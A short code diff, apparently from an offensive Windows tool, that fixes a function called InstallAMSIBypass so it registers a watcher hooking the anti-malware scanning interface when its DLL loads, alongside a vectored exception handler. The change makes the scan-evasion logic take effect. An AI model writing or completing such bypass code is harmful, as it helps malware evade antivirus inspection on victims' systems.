@@ -259,7 +259,9 @@ BOOL InstallAMSIBypass(void) {
     s_hVEH = AddVectoredExceptionHandler(1, VEH_AMSIHandler);
     if (!s_hVEH) return FALSE;
 
-    /* We'll set breakpoints lazily in the notification callback */
+    /* FIXED: Actually call the watcher so it hooks upon load */
+    RegisterAMSIDllWatch();
+
     return TRUE;
 }
 
